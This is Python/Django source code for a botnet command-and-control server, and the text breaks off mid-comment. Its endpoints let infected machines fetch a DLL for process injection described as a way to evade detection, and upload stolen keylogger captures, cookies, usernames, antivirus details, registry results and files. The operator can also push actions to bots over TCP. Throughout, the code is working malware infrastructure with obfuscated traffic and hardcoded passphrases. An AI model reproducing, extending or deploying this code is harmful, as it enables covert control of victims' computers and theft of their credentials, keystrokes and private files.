from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpResponse, HttpResponseBadRequest
from django.core.servers.basehttp import FileWrapper
import sys
import socket
import pygeoip
import json
import re
import datetime
import hashlib
import time
from time import gmtime, strftime
from threading import Thread
import functools
import binascii
import base64

# imports and set environmental variables
import sqlite3
import os
os.environ.setdefault('DJANGO_SETTINGS_MODULE','admin_ui_project.settings')

# setup django
import django
django.setup()

#import botmaster database models
from database.models import System_Information, Antivirus, Connection, Keylogging, Location, Registry, User, Bot_Sample, Action, Bot_Action, ConnectionRules, AvailableConnections, AvailableRegistry, Files, AvailableFiles

# global database variabless
conn = None     # database connection
botinfo = None  # database iterator
THRESHOLD = 999 # max number of connections for the day, anything more is suspicious
MAX_CONNECTIONS = 999 # max number of overall connections, -1 for infinite
MAX_CONNECTIONS_PER_DAY = 25 # max number of connections for the day, -1 for infinite
NO_CONNECTIONS_BEFORE = None # earliest a bot can connect during the day
NO_CONNECTIONS_AFTER = None  # the latest a bot can connect during a day
ONFAILURE = None             # ALLOW/DENY a if it breaks a rule
RESPONSE = None              # how the botmaster will response to a broken rule
ACTION = None                # what action the botmaster should return on a broken rule
RULESACTIVE = False          # if the above rules are active or not

TCPSERVERON = False

PASSPHRASE = 'A79BH4G9'
KEYLOGGING_PASSPHRASE = 'H4G9A79B'

import urlparse


def handle_uploaded_dll(bot_id, f):
    with open('./database/dll/'+str(bot_id)+".dll", 'wb+') as destination:
        destination.write(f)

@csrf_exempt
def store_dll(request):
    if request.method == 'POST' and 'bot_id' in request.GET and request.GET['passphrase'] == PASSPHRASE:
        handle_uploaded_dll(request.GET['bot_id'], request.body)
        return HttpResponse(200)
    return HttpResponse(400)


###################### START DLL DOWNLOADER ############################
# The dll downloader api allows a bot to download its corresponding dll
# copy of main so that it is able to inject that dll into a seperate process
# to hide itself from plain detection techniques
@csrf_exempt
def download(request):
    # decrypt if necessary
    if('request' in request.GET):
        query_string = decryptRequest(request.GET['request'])
        dictionary = createDictionaryFromString(query_string)
    else:
        dictionary = request.GET

    # check that parameters are correct
    if('bot_id' not in dictionary or 'passphrase' not in dictionary):
        return HttpResponse(400)

    else:
        # check that passphrase is correct
        if(passphrase != PASSPHRASE):
            return HttpResponse(400)
        bot_id = dictionary['bot_id']
        # bot exists
        if(len(getBot(bot_id))>0):
            # path to corresponding dll, return dll
            path = os.path.dirname(os.path.realpath(__file__))
            dll_file = open(str(path)+"\\dll\\"+str(bot_id)+".dll", 'rb')
            response = HttpResponse(FileWrapper(dll_file), content_type='application/zip')
            response['Content-Disposition'] = 'attachment; filename="%s"' % str('extern.dll')
            return response
    return HttpResponse(400)
###################### END DLL DOWNLOADER ##############################

#################### FUNCTION FOR REQUEST ENCRYPT/DECRYPT ##############
def decryptRequest(request):
    decode = base64.b64decode(request)
    decode = decode.decode('ascii')
    #build a sample url so that it can parse the whole thing
    query = urlparse.urlsplit("www.google.com/?"+decode).query
    return query

def encryptResponse(response):
    response = response.encode('ascii')
    encode = base64.b64encode(response)
    encode = encode.decode('ascii')
    return encode

def createDictionaryFromString(query):
    dictionary = urlparse.parse_qs(query)
    for x in dictionary:
        dictionary[x] = dictionary[x][0]
    return dictionary
##########################################################################

########################### START HANDLER ################################
# The handler API takes in a mac address, bot id, and any amount of informational data
# The handler will parse the data and destribute it to other APIs so that the information can 
# stored in the database
@csrf_exempt
def handler(request):
    # print(request.POST)
    # decrypt if necessary
    if('request' in request.POST):
        query_string = decryptRequest(request.POST['request'])
        dictionary = createDictionaryFromString(query_string)
    else:
        dictionary = request.POST

    query_string = request.body

    #print(dictionary)

    # check for params
    if 'mac_address' in dictionary and 'bot_id' in dictionary:
        bot_info = getBot(dictionary['bot_id'])[0]
        bot_id = dictionary['bot_id']
        mac_address = dictionary['mac_address']
        ip_address = 'xxx.xxx.xxx.xxx'
        sys_information = getSystemInformation(mac_address)

        # optional ip_address param
        if('ip_address' in dictionary):
            ip_address = dictionary['ip_address']
        # get ip address from connection to django
        if 'REMOTE_ADDR' in request.META:
            ip_address = request.META.get('REMOTE_ADDR')

        # bot is denied
        if(not bot_info[4]):
            return HttpResponse(400)
            return HttpResponse('BOT DENIED')                               # SHOULD WE RETURN ANYTHING?

        # else, if connection status is false
        if(not sys_information[3]):
            # mac_address is denied from connections
            return HttpResponse(400)
            return HttpResponse("MAC DENIED")                               # SHOULD WE RETURN ANYTHING?
        
        # increment bot connection count
        botConnectIn(bot_id)

        # linknig information to a connection and to a mac_address
        connectionObj = insertConnection(bot_id,mac_address,ip_address,'/api/handler/')

        # os info sent
        if 'os' in dictionary:
            add_os(request, False, connectionObj)
        # processor info sent
        if 'cpu' in dictionary:
            add_cpu(request, False, connectionObj)
        # usename sent
        if 'username' in dictionary:
            add_username(request, True, connectionObj)
        # antivirus send
        if 'antivirus' in dictionary:
            add_antivirus(request, True, connectionObj)
        # registry key check sent
        if 'registry' in dictionary:
            regtemp=""
            for reg in re.findall(r'registry=([\w|\\|0-9|:|_|-]+)',str(query_string)):
                add_registry(request, True, connectionObj, reg)
        # keylogging info sent
        if 'keylogging' in dictionary:
            add_keylogging(request, True, connectionObj)
        # cookies info sent
        if 'cookies' in dictionary:
            add_cookies(request, True, connectionObj)
        # file info sent
        if 'file' in dictionary:
            length = (len(re.split(r'contents=(.*)', str(query_string))[0])+len("contents="))
            # print(query_string)
            add_file(request, True, connectionObj, query_string[length-4:])

        # ADD OTHER INFORMATION TYPES HANDLERS HERE
        #
        #
        
    return HttpResponse(200)
########################### END HANDLER ################################

####################### START SERVER_STATUS ############################
# The server status API is utilized by bot samples to let the botmaster know
# that they are currently running a TCP server to recieve actions in
# real time by the botmaster admin as they so choose to do
@csrf_exempt
def server_status(request):
    # NOT MAC, BOT ID, PORT, IP ADDRESS
    if 'mac_address' not in request.POST or 'bot_id' not in request.POST or 'ip_address' not in request.POST or 'port' not in request.POST:
        return HttpReponse(400)
    # parameters exist
    else:
        return HttpResponse(333)
        mac_address = request.POST['mac_address']
        bot_id = request.POST['bot_id']
        ip_address = request.POST['ip_address']
        port = request.POST['port']

        # check for valid ip_address, port, and bot_id
        if(isIpValid(ip_address) and int(port) == 20000 and getBot(bot_id) != []):
            # get system information
            sys_information = getSystemInformation(mac_address)
            # if mac_address does not exists, add it
            if(sys_information == None):
                # VALID MAC_ADDRESS FORMAT
                if(isMacValid(mac_address)):
                    # add new mac_address
                    insertSystemInformation(mac_address)
                    # add connection
                # INVALID MAC_ADDRESS FORMAT
                else:
                    return HttpResponse(400)

            # get available connection object
            server_obj = getAvailableConnection(mac_address, bot_id)
            # available connection does not exist, add it
            if(server_obj == None):
                insertAvailableConnection(mac_address, bot_id, ip_address, port)
            # available connection exists, update ip_address and port
            else:   
                server_obj.ip_address = ip_address
                server_obj.port = port
                server_obj.online = True
                server_obj.save()

            return HttpResponse(200)
        # invalid parameters
        else:
            return HttpResponse(400)
######################## END SERVER_STATUS #############################

########################## START TIMEOUT ###############################
# The timeout function allows for the use fo running a function in a thread
# so that you can set a timeout value if the function is taking too long
# - This is utilized for the TCP send and connect incase the server is down
# - allowing the code to return a result back in stead of waiting for a connection timeout
def timeout(timeout):
    def deco(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            res = [Exception('function [%s] timeout [%s seconds] exceeded!' % (func.__name__, timeout))]
            def newFunc():
                try:
                    res[0] = func(*args, **kwargs)
                except(Exception,e):
                    res[0] = e
            t = Thread(target=newFunc)
            t.daemon = True
            try:
                t.start()
                t.join(timeout)
            except(Exception,je):
                raise je
            ret = res[0]
            return ret
        return wrapper
    return deco
##########################  END  TIMEOUT ###############################

####################### START CHECK_SERVER #############################
# This function is utilized for check in a bot TCP server is currently running
# It is utilized by the botmaster admin interface so that they admin
# can check if a bot is available to receive an action before sending one
def check_server(address, port):
    global TCPSERVERON
    # Create a TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((address, int(port)))
        s.close()
        TCPSERVERON=True
        return True
    except(socket.error,):
        s.close()
        TCPSERVERON=False
        return False
#######################  END CHECK_SERVER  #############################

####################### START CHECK_STATUS #############################
# This function is the API handler for when a botmaster admin would like to 
# check if a bot TCP server is running to receive actions. The API calls 
# the above check_server function with a timeout so that it does not have to
# wait for the connection to timeout to determine the server is not up
@csrf_exempt
def check_status(request):
    global TCPSERVERON
    # valid paramters for server check do not exist
    if 'mac_address' not in request.GET or 'bot_id' not in request.GET or 'ip_address' not in request.GET or 'port' not in request.GET:
        return HttpResponse(400)
    # valid parameters do exist
    else:
        mac_address = request.GET['mac_address']
        bot_id = request.GET['bot_id']
        ip_address = request.GET['ip_address']
        #compare sent ip to external ip
        #
        #
        #
        #
        #
        port = request.GET['port']

        # get the server connection entry from the availableconnections table
        server_obj = getAvailableConnection(mac_address, bot_id)

        # connection does not exist in table entries
        if(server_obj == None):
            return HttpResponse(400)

        # connection does exist in table entries
        else:
            # attempt to connect to the server to see if it is up
            func = timeout(timeout=5)(check_server)('127.0.0.1','50007')
            try:
                func()
            # function timeout handler
            except:
                # status = False
                if(not TCPSERVERON):
                    status = False
                else:
                    status = True

            server_obj.online = status
            server_obj.save()
            # results of server check
            if(status):
                return HttpResponse('true')
            else:
                return HttpResponse('false')
#######################  END CHECK_STATUS  #############################

####################### START SEND_MESSAGE #############################
# This function is used to send the action to the TCP server of the 
# bot looking for actions
def send_message(address, port, message):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((address, int(port)))
        s.send(message)
        data = s.recv(1024)
        s.close
        return True
    except(socket.error,):
        s.close()
        return False
#######################  END CHECK_STATUS  #############################

def isEncrypted(bot_id):
    bot_obj = Bot_Sample.objects.filter(bot_id=bot_id)
    if(len(bot_obj) > 0):
        return bot_obj[0].encrypted
    else:
        return False

###################  START CONSTRUCT_ACTION  ###########################
# This function is used to construct the proper format for an action that is
# going to a bot, the function takes the action name and will append on any 
# data the is required for that action to the end so that the action meets 
# the following format. DATA is not required for all actions
#         ACTION_NAME : [ DATA1 , DATA2 ...]
def constructAction(mac_address,bot_id,action_name,encryptedConnection=False):
    action = '"' + action_name + '":['
    file_to_do = ""

    # construct action format here
    # construct special handlers here

    # adding a registry to CheckRegistry
    if(action_name == 'Check Registry'):
        checked_temp = getRegistries(mac_address)
        checked_registries = []
        for x in checked_temp:
            checked_registries.append(x[1])
        all_registries=AvailableRegistry.objects.all()
        for reg in all_registries:
            # find a registry that has not been checked
            if reg not in checked_registries:
                registry_to_do=str(reg)
                break
        # add data
        action += str(registry_to_do) + "]"
    # adding a file to get to GetFile 
    elif(action_name == 'Send File'):
        checked_temp = getFiles(mac_address, bot_id)
        checked_files = []
        for x in checked_temp:
            checked_files.append(x[1])
        all_files=AvailableFiles.objects.all()
        i = 0
        for _file in all_files:
            # find a file that has not been gotten and is active
            if _file not in checked_files and all_files[i].active:
                file_to_do=str(_file).replace('\\\\', '\\')
                break
            i = i + 1
        if(file_to_do!= ""):
            # add data
            action += str(file_to_do) + "]" 
        else:
            return '"":[]'
    # OTHER CONDITIONS HERE

    # no special handling required
    else:
        # no data to send
        action += "]"

    #encrypting response if bot is capable of encrypted connection
    if(encryptedConnection):
        action = encryptResponse(action)
        action = "response=" + action
    print(action)
    return action
###################### END CONSTRUCT_ACTION  ###########################

######################## START SEND_ACTION #############################
# This API is utilized by the botmaster admin interface. The botmaster
# has selected an action for the botmaster to do and presses 'send action'
# A request is handled and takes the server information and the action to send
# and sends that action to the associated bot
@csrf_exempt
def send_action(request):
    # valid paramters for server check do not exist
    if 'mac_address' not in request.GET or 'bot_id' not in request.GET or 'ip_address' not in request.GET or 'port' not in request.GET or 'action' not in request.GET:
        return HttpResponse(400)
    # valid parameters do exist
    else:
        mac_address = request.GET['mac_address']
        bot_id=request.GET['bot_id']
        ip_address=request.GET['ip_address']
        action=request.GET['action']

        # build the format based off of the action name
        message = constructAction(mac_address,bot_id,action,isEncrypted(bot_id))
        # print(message)

        # send action
        func = timeout(timeout=5)(send_message)(request.GET['ip_address'],int(request.GET['port']),message)
        try:
            func()
        # function timeout
        except:
            pass
        return HttpResponse(200)
#######################  END SEND_ACTION  #############################

######################  START CONNECT_IN  #############################
# This API is utilized by the build bots so that they can make a request
# to the botmaster where they will receive an available action from
# the botmaster if there are any actions to perform
@csrf_exempt
# bot_id, mac_address, ip_address[optional]
def connect_in(request, connectionCounted=False, connObj=None):
    # print(request.GET)
    # decrypt if necessary
    if('request' in request.GET):
        query_string = decryptRequest(request.GET['request'])
        dictionary = createDictionaryFromString(query_string)
    else:
        dictionary = request.GET

    print(dictionary)

    # NO MAC_ADDRESS OR NO BOT_ID
    if 'mac_address' not in dictionary or 'bot_id' not in dictionary:
        return HttpResponse(400)

    # MAC_ADDRESS, BOT_ID
    else:
        mac_address = dictionary['mac_address']
        bot_id = dictionary['bot_id']
        # print(bot_id)
        # invalid bot id
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
            # check the connection rules for the connection
            connectResponse = checkConnectionRules(mac_address, bot_id)
            # do not response
            if(connectResponse == -1):
                return HttpResponseBadRequest()
            # response with an action
            elif(connectResponse == 1):
                # construct formatted action
                action_message = constructAction(mac_address,bot_id,ACTION,isEncrypted(bot_id))
                # return action
                return HttpResponse(action_message)                             # SEND ACTION

            # increment bot connection count
            if(not connectionCounted):
                botConnectIn(bot_id)
            #bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            #bot is denied
            if(not bot_info[4]):
                return HttpResponse(400)
                return HttpResponse('BOT DENIED')                               #SHOULD WE RETURN ANYTHING?

        # GET OTHER POST INFO
        sys_information = getSystemInformation(mac_address)
        ip_address = 'xxx.xxx.xxx.xxx'
        # check if an ip address was passed as a param
        if 'ip_address' in dictionary:
            # check if ip_address is valid
            if(isIpValid(dictionary['ip_address'])):
                ip_address = dictionary['ip_address']
        # get ip address from connection to django
        if 'REMOTE_ADDR' in request.META:
            ip_address = request.META.get('REMOTE_ADDR')

        #OLD INFO
        if(sys_information!=None):
            # if mac_address is allowed to make connections
            if(sys_information[3]):
                # add connection
                insertConnection(bot_id,mac_address,ip_address,'/api/connect_in/')
            # else, if connection status is false
            else:
                # mac_address is denied from connections
                return HttpResponse(400)
                return HttpResponse("MAC DENIED")                                # SHOULD WE RETURN ANYTHING?
        # NEW INFO
        else:
            # VALID MAC_ADDRESS
            if(isMacValid(mac_address)):
                # add new mac_address
                insertSystemInformation(mac_address)
                # add connection
                insertConnection(bot_id,mac_address,ip_address,'/api/connect_in/')
            # INVALID MAC_ADDRESS
            else:
                return HttpResponse(400)

        # SEND AN ACTION
        bot_id = dictionary['bot_id']
        actions = getOrderedBotAction(bot_id)
        actionInfo = []
        # get all actions for a bot
        for action in actions:
            actionInfo.append([action, getActionById(action[1])[0]])
        # make bot, action pairs
        for action in actionInfo:                                                # loop through actions
            # action type is enabled
            if(action[1][2]):                                                       # check if action is enabled
                #check if action is enabled for specific bot
                action_obj = Action.objects.filter(action = action[1][1])
                bot_samples_obj = Bot_Sample.objects.filter(bot_id = bot_id)
                bot_action_obj = Bot_Action.objects.filter(bot_id = bot_samples_obj, action = action_obj)
                if(bot_action_obj[0].enabled):
                    # action is new
                    if(action[0][2] == 0):                                                  # action is new, perform it
                        # incrememnt count
                        incrementBotAction(bot_id,action[1][1])
                        # if action can only be done once, disable it
                        if(action[1][3] == 'Once'):
                            disableBotAction(bot_id,action[1][1])
                        # construct formatted bot action
                        action_message = constructAction(mac_address,bot_id,action[1][1],isEncrypted(bot_id))
                        # return action
                        return HttpResponse(action_message)                           # SEND ACTION
                    # action has been done before
                    else:                                                             # action is old, see if it should be performed
                        # do not send action unless proven sendable
                        send_action = False
                        # not a time based action
                        if(action[1][3] == 'Anytime'):
                            #action will be sent
                            send_action = True
                        # time based action
                        else:                                                        # time based action-type check
                            # get time action was last performed
                            year = int(action[0][4][0:4])
                            month = int(action[0][4][5:7])
                            day = int(action[0][4][8:10])
                            hour = int(action[0][4][11:13])
                            # determines if action should be sent
                            # if action should be sent, if not check next action
                            send_action = validateActionType(action[1][3], year, month, day, hour)

                        # if action should be sent
                        if(send_action):                                            # ACTION SHOULD BE SENT
                            # increment count, last_performed timestamp
                            incrementBotAction(bot_id, action[1][1])
                            # construct a formatted action
                            action_message = constructAction(mac_address,bot_id,action[1][1],isEncrypted(bot_id))
                            # return action
                            return HttpResponse(action_message)                           # SEND ACTION
        # no actions are available to be done
        return HttpResponse('"":[]')
######################   END CONNECT_IN   #############################


################  START VALIDATE_ACTION_TYPE  #########################
# This funcion is used to determine if is has been the appropriate amount
# of time in between when an action was last done and now
# This is determined by the frequency at which an action can be done
def validateActionType(action_type, year, month, day, hour):
    now = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())
    now_year =int(now[0:4])
    now_month = int(now[5:7])
    now_day =int(now[8:10])
    now_hour =int(now[11:13])
    send_action = False
    # hourly action
    if(action_type == 'Hourly'):
        if(now_hour - hour >= 1):
            send_action = True
    # daily action
    elif(action_type == 'Daily'):
        if(now_day - day >= 1):
            send_action = True
    # weekly action
    elif(action_type == 'Weekly'):
        if(now_day - day >= 7):
            send_action = True
    # biweekly action
    elif(action_type == 'Biweekly'):
        if(now_day - day >=14):
            send_action = True
    # monthly action
    elif(action_type == 'Monthly'):
        if(now_month - month >= 1):
            send_action = True
    # quarterly action
    elif(action_type == 'Quarterly'):
        if(now_month - month >= 3):
            send_action = True
    # bianually action
    elif(action_type == 'Bianually'):
        if(now_month - month >= 3):
            send_action = True
    # yearly action
    elif(action_type == 'Yearly'):
        if(now_year - year >= 1):
            send_action = True
    # invalid time based action type
    else:
        send_action = False

    return send_action
##################  END VALIDATE_ACTION_TYPE  #########################

#######################  START ADD_OS  ################################
# This function is utilized for the add_os API. This function allows
# for the operating system information to be added into the database for
# a corresponding system (mac_address)
# This API is also called by the handler API when os information is passed
@csrf_exempt
# mac_address, os, bot_id ip_address[optional]
def add_os(request, connectionCounted=False, connObj=None):
    # decrypt if necessary
    if('request' in request.POST):
        query_string = decryptRequest(request.POST['request'])
        dictionary = createDictionaryFromString(query_string)
    else:
        dictionary = request.POST

    if(request.method == 'POST'):
        # parameters do not match
        if 'mac_address' not in dictionary or 'os' not in dictionary or 'bot_id' not in dictionary:
            return HttpResponse(400)
        mac_address = dictionary['mac_address']
        op_sys = dictionary['os']
        ip_address = 'xxx.xxx.xxx.xxx'

        # CHECK IF VALID BOT_ID
        bot_id = dictionary['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
            # increment bot connection count
            if(not connectionCounted):
                botConnectIn(bot_id)
            # bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        # check if an ip address was passed as a param
        if 'ip_address' in dictionary:
            if(isIpValid(dictionary['ip_address'])):
                ip_address = dictionary['ip_address']
        # add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            # mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        # add connection if a connection does not already exist
        if(not connectionCounted):
            if(connObj == None):
                connObj = insertConnection(bot_id, mac_address,ip_address,'/api/add_os/')
            else:
                connObj = insertConnection(bot_id, mac_address,ip_address,'handler --> /api/add_os/')
        # update os
        updateOS(mac_address, op_sys, connObj)
        return HttpResponse(200)
    else:
        return HttpResponse(400)
#######################  START ADD_OS  ################################

#######################  START ADD_CPU  ###############################
# This function is utilized for the add_cpu API. This function allows
# for the CPU information to be added into the database for
# a corresponding system (mac_address)
# This API is also called by the handler API when CPU information is passed
@csrf_exempt
# mac_address, cpu, bot_id, ip_address[optional]
def add_cpu(request, connectionCounted=False, connObj=None):
    # decrypt if necessary
    if('request' in request.POST):
        query_string = decryptRequest(request.POST['request'])
        dictionary = createDictionaryFromString(query_string)
    else:
        dictionary = request.POST

    if(request.method == 'POST'):
        # parameters do not match
        if 'mac_address' not in dictionary or 'cpu' not in dictionary or 'bot_id' not in dictionary:
            return HttpResponse(400)
        mac_address = dictionary['mac_address']
        cpu = dictionary['cpu']
        ip_address = 'xxx.xxx.xxx.xxx'

        # CHECK IF VALID BOT_ID
        bot_id = dictionary['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
            # increment bot connection count
            if(not connectionCounted):
                botConnectIn(bot_id)
            # bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        # check if an ip address was passed as a param
        if 'ip_address' in dictionary:
            if(isIpValid(dictionary['ip_address'])):
                ip_address = dictionary['ip_address']
        # get ip address from connection to django
        if 'REMOTE_ADDR' in request.META:
            ip_address = request.META.get('REMOTE_ADDR')

        # add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            # mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        # add connection if a connection does not already exist
        if(not connectionCounted):
            if(connObj == None):
                connObj = insertConnection(bot_id, mac_address,ip_address,'/api/add_cpu/')
            else:
                connObj = insertConnection(bot_id, mac_address,ip_address,'handler --> /api/add_cpu/')
        # update cpu
        updateCPU(mac_address, cpu, connObj)
        return HttpResponse(200)
#######################   END ADD_CPU   ###############################


#*************************NOT IN USE***********************************
###################  START ADD_ANTIVIRUS  #############################
# This function is utilized for the add_antivirus API. This function
# allows for the antivirus information to be added into the database for
# a corresponding system (mac_address)
# This API is also called by the handler API when antivirus information is passed
@csrf_exempt
# mac_address, bot_id, antivirus, ip_address[optional]
def add_antivirus(request, connectionCounted=False, connObj=None):
    # decrypt if necessary
    if('request' in request.POST):
        query_string = decryptRequest(request.POST['request'])
        dictionary = createDictionaryFromString(query_string)
    else:
        dictionary = request.POST

    if(request.method == 'POST'):
        # parameters do not match
        if 'mac_address' not in dictionary or 'antivirus' not in dictionary or 'bot_id' not in dictionary:
            return HttpResponse(400)
        mac_address = dictionary['mac_address']
        antivirus = dictionary['antivirus']
        ip_address = 'xxx.xxx.xxx.xxx'

        # CHECK IF VALID BOT_ID
        bot_id = dictionary['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
            # increment bot connection count
            if(not connectionCounted):
                botConnectIn(bot_id)
            # bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        # check if an ip address was passed
        if 'ip_address' in dictionary:
            if(isIpValid(dictionary['ip_address'])):
                ip_address = dictionary['ip_address']
        # get ip address from connection to django
        if 'REMOTE_ADDR' in request.META:
            ip_address = request.META.get('REMOTE_ADDR')

        # add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            # mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        # add connection if one does not exist
        if(not connectionCounted):
                connObj = insertConnection(bot_id, mac_address,ip_address,'/api/add_antivirus/')
        # add antivirus
        insertAntivirus(mac_address, antivirus, connObj)
        return HttpResponse(200)
###################   END ADD_ANTIVIRUS   #############################
#*************************NOT IN USE***********************************

####################  START ADD_REGISTRY  #############################
# This function is utilized for the add_registry API. This function
# allows for the registry information to be added into the database for
# a corresponding system (mac_address)
# This API is also called by the handler API when antivirus information is passed
@csrf_exempt
# mac_address, bot_id, registry, ip_address[optional]
def add_registry(request, connectionCounted=False, connObj=None, registry=None):
    # decrypt if necessary
    if('request' in request.POST):
        query_string = decryptRequest(request.POST['request'])
        dictionary = createDictionaryFromString(query_string)
    else:
        dictionary = request.POST

    if(request.method == 'POST'):
        # parameters do not match
        if 'mac_address' not in dictionary or 'registry' not in dictionary or 'bot_id' not in dictionary:
            return HttpResponse(400)
        mac_address = dictionary['mac_address']
        registries = []
        if(registry == None):
            registry_temp = dictionary['registry']
            for reg in registry_temp:
                reg = reg.split(":")
                registries.append(reg)
        else:
           reg = registry.split(":")
           registries.append(reg)
        ip_address = 'xxx.xxx.xxx.xxx'

        # CHECK IF VALID BOT_ID
        bot_id = dictionary['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
            # increment bot connection count
            if(not connectionCounted):
                botConnectIn(bot_id)
            # bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        # check if an ip address was passed as a param
        if 'ip_address' in dictionary:
            if(isIpValid(dictionary['ip_address'])):
                ip_address = dictionary['ip_address']
        # get ip address from connection to django
        if 'REMOTE_ADDR' in request.META:
            ip_address = request.META.get('REMOTE_ADDR')

        # add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            # mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        # add a connection if one does not already exist
        if(not connectionCounted):
            connObj = insertConnection(bot_id, mac_address,ip_address,'/api/add_registry/')
        # add registry
        for reg in registries:
            if(reg[1] == 'True'):
                detect_flag=True
            else:
                detect_flag=False
            reg[0].replace("\\\\\\\\","\\\\")
            insertRegistry(mac_address, reg[0], connObj, detect_flag)
        return HttpResponse(200)
###################   END ADD_ANTIVIRUS   #############################

###################  START ADD_USERNAME  #############################
# This function is utilized for the add_username API. This function
# allows for the username information to be added into the database for
# a corresponding system (mac_address)
# This API is also called by the handler API when username information is passed
@csrf_exempt
# mac_address,bot_id, username, ip_address[optional]
def add_username(request, connectionCounted=False, connObj=None):
    # decrypt if necessary
    if('request' in request.POST):
        query_string = decryptRequest(request.POST['request'])
        dictionary = createDictionaryFromString(query_string)
    else:
        dictionary = request.POST

    if(request.method == 'POST'):
        # parameters do not match
        if 'mac_address' not in dictionary or 'username' not in dictionary or 'bot_id' not in dictionary:
            return HttpResponse(400)
        mac_address = dictionary['mac_address']
        username = dictionary['username']
        ip_address = 'xxx.xxx.xxx.xxx'

        # CHECK IF VALID BOT_ID
        bot_id = dictionary['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
            # increment bot connection count
            if(not connectionCounted):
                botConnectIn(bot_id)
            # bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        # check if an ip address was passed as a param
        if 'ip_address' in dictionary:
            if(isIpValid(dictionary['ip_address'])):
                ip_address = dictionary['ip_address']
        # get ip address from connection to django
        if 'REMOTE_ADDR' in request.META:
            ip_address = request.META.get('REMOTE_ADDR')

        # add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            # mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        # add connection if one does not already exist
        if(not connectionCounted):
            connObj = insertConnection(bot_id, mac_address,ip_address,'/api/add_username/')
        # add username
        insertUsername(mac_address, username, connObj)
        return HttpResponse(200)
###################   END ADD_ANTIVIRUS   #############################

##################  START ADD_KEYLOGGING  #############################
# This function is utilized for the add_keylogging API. This function
# allows for the keylogging information to be added into the database for
# a corresponding system (mac_address)
# This API is also called by the handler API when keylogging information is passed
@csrf_exempt
# mac_address, bot_id, file(attatched to post), ip_address[optional]
def add_keylogging(request, connectionCounted=False, connObj=None):
    # decrypt if necessary
    if('request' in request.POST):
        query_string = decryptRequest(request.POST['request'])
        dictionary = createDictionaryFromString(query_string)
    else:
        dictionary = request.POST

    if(request.method == 'POST'):
        # parameters do not match
        if 'mac_address' not in dictionary or 'bot_id' not in dictionary or 'keylogging' not in dictionary:
            return HttpResponse(400)
        mac_address = dictionary['mac_address']
        ip_address = 'xxx.xxx.xxx.xxx'

        # CHECK IF VALID BOT_ID
        bot_id = dictionary['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
            # increment bot connection count
            if(not connectionCounted):
                botConnectIn(bot_id)
            # bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        # check if an ip address was passed as a param
        if 'ip_address' in dictionary:
            if(isIpValid(dictionary['ip_address'])):
                ip_address = dictionary['ip_address']
        # get ip address from connection to django
        if 'REMOTE_ADDR' in request.META:
            ip_address = request.META.get('REMOTE_ADDR')

        # add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            # mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        # make sure that mac_address exists before entering file
        if(getSystemInformation(mac_address)!=None):
            # add connection if connection does not exist
            if(not connectionCounted):
                connObj= insertConnection(bot_id, mac_address,ip_address,'/api/add_keylogging/')
            # pass keylogging information to the keylogging handler
            handle_uploaded_keylog(mac_address, dictionary['keylogging'], connObj)
        return HttpResponse(200)
####################  END ADD_KEYLOGGING  #############################

###############  START HANDLE_UPLOADED_KEYLOG  ########################
# This function is utilized for handling any keylogging string that was
# sent to the keylogging API, the handler figures out the id of the 
# keylogging file it will save the string to and adds the keylogging
# file to the appropiate directory on the botmaster file system
def handle_uploaded_keylog(mac_address, string, connObj):
    # count files in directory
    file_count = 1
    # check if file is an acceptable name, increment name if not valid
    while(insertKeylogging(mac_address, mac_address+"---"+str(file_count),connObj) == 0):
        file_count = file_count + 1
    # check if directory exists, create if not
    try:
        os.stat("./database/keylogging/"+mac_address)
    except:
        os.mkdir("./database/keylogging/"+mac_address)
    # open file within the keylogging folder
    filename = "./database/keylogging/"+mac_address+"/"+mac_address + '---' +str(file_count)+".txt"
    destination = open(filename, 'w')
    # write keylog info
    destination.write(str(string))
    # close file
    destination.close()
###############  END HANDLE_UPLOADED_KEYLOG  ##########################

###################  START GET_KEYLOGGING  ############################
# This function is utilized for the botmaster administrator view
# the API is utilized to get a specific keylogging file and return the
# contents of that file. It is used to return the info for any keylogging
# file the botmaster admin wishes to view
#
